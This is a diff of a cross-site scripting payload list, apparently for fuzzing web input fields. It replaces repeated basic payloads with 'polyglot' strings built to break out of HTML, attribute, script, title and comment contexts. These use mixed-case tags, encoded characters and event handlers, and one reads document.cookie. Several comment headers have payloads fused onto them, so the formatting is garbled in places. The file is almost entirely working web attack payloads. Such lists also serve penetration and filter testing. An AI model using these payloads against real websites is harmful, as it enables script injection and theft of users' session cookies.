@@ -1,40 +1,77 @@
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
+# Polyglot XSS Payloads - Work in Multiple Contexts"><script>alert(1)</script>
+
+# These payloads are designed to work in various injection points"><img src=x onerror=alert(1)>
+
 "><svg onload=alert(1)>
-"><body onload=alert(1)>
-"><iframe src=javascript:alert(1)>
-";alert(1)//
-</title><script>alert(1)</script>
-"><a href=javascript:alert(1)>Click me</a>
-"><details open ontoggle=alert(1)>
+
+# Classic polyglots (work in multiple contexts)"><body onload=alert(1)>
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"><iframe src=javascript:alert(1)>
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">";alert(1)//
+
+'";!--"<XSS>=&{()}</title><script>alert(1)</script>
+
+"onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"><a href=javascript:alert(1)>Click me</a>
+
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"><details open ontoggle=alert(1)>
+
 "><marquee onstart=alert(1)>XSS</marquee>
 
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
-"><body onload=alert(1)>
-"><iframe src=javascript:alert(1)>
-";alert(1)//
-</title><script>alert(1)</script>
-"><a href=javascript:alert(1)>Click me</a>
-"><details open ontoggle=alert(1)>
+# Context-breaking polyglots
+
+"><script>alert(1)</script>"><script>alert(1)</script>
+
+'><script>alert(1)</script>"><img src=x onerror=alert(1)>
+
+"><img src=x onerror=alert(1)>"><svg onload=alert(1)>
+
+'><img src=x onerror=alert(1)>"><body onload=alert(1)>
+
+"><svg onload=alert(1)>"><iframe src=javascript:alert(1)>
+
+'><svg onload=alert(1)>";alert(1)//
+
+";alert(1)//</title><script>alert(1)</script>
+
+';alert(1)//"><a href=javascript:alert(1)>Click me</a>
+
+*/alert(1)/*"><details open ontoggle=alert(1)>
+
+--><img src=x onerror=alert(1)>"><marquee onstart=alert(1)>XSS</marquee>
+
+
+
+# Advanced polyglots combining multiple techniques"><script>alert(1)</script>
+
+<script>alert(1)</script><img src=x onerror=alert(1)><svg onload=alert(1)>"><img src=x onerror=alert(1)>
+
+</scrIpt><img src=x onerror=alert(1)>"><svg onload=alert(1)>
+
+</title><script>alert(1)</script>"><body onload=alert(1)>
+
+"><iframe src=javascript:alert(1)>"><iframe src=javascript:alert(1)>
+
+"><body onload=alert(1)>";alert(1)//
+
+"><a href=javascript:alert(1)>Click me</a></title><script>alert(1)</script>
+
+"><details open ontoggle=alert(1)>"><a href=javascript:alert(1)>Click me</a>
+
+"><marquee onstart=alert(1)>XSS</marquee>"><details open ontoggle=alert(1)>
+
 "><marquee onstart=alert(1)>XSS</marquee>
 
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
-"><body onload=alert(1)>
-"><iframe src=javascript:alert(1)>
-";alert(1)//
-</title><script>alert(1)</script>
-"><a href=javascript:alert(1)>Click me</a>
-"><details open ontoggle=alert(1)>
-"><marquee onstart=alert(1)>XSS</marquee>
+# Minimal but effective polyglots  
 
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
-"><body onload=alert(1)>
+<img src=x onerror=alert(1)>"><script>alert(1)</script>
+
+<svg onload=alert(1)>"><img src=x onerror=alert(1)>
+
+<script>alert(1)</script>"><svg onload=alert(1)>
+
+javascript:alert(1)"><body onload=alert(1)>
+
 "><iframe src=javascript:alert(1)>
 ";alert(1)//
 </title><script>alert(1)</script>
